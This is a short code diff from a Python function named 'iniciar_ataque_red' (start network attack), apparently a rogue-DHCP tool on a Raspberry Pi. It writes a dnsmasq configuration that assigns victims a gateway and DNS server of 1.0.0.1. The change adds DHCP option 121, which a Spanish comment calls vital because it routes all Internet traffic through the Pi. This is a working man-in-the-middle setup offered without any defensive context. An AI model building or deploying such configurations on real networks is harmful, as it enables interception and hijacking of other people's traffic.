@@ -62,9 +62,10 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
         # 2. DHCP (dnsmasq configurado con máscara Clase A)
         config_dhcp = (
             f"interface={interface}\n"
-            f"dhcp-range=1.0.0.10,1.0.0.250,255.0.0.0,12h\n" # Forzamos la máscara 255.0.0.0
-            f"dhcp-option=3,1.0.0.1\n"                       # Puerta de enlace
-            f"dhcp-option=6,1.0.0.1\n"                       # DNS
+            f"dhcp-range=1.0.0.10,1.0.0.250,255.0.0.0,12h\n"
+            f"dhcp-option=3,1.0.0.1\n"                       
+            f"dhcp-option=6,1.0.0.1\n"                       
+            f"dhcp-option=121,0.0.0.0/0,1.0.0.1\n"  # <- ESTA LÍNEA ES VITAL: Enruta todo Internet a la Pi
             f"bind-interfaces\n"
         )
         
